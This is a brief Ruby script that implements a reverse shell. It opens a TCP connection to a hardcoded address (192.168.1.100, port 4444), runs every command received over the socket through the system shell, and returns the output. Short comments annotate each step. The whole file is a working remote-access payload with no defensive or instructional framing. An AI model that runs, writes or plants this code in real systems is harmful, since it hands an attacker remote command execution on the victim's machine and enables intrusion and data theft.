require 'socket'

# Set the IP and port to connect to
ip = '192.168.1.100'
port = 4444

# Create a socket and connect to the IP and port
s = TCPSocket.new ip, port

# Execute shell commands and send the output back to the IP and port
while cmd = s.gets
  output = `#{cmd}`
  s.puts output
end

# Close the socket
s.close
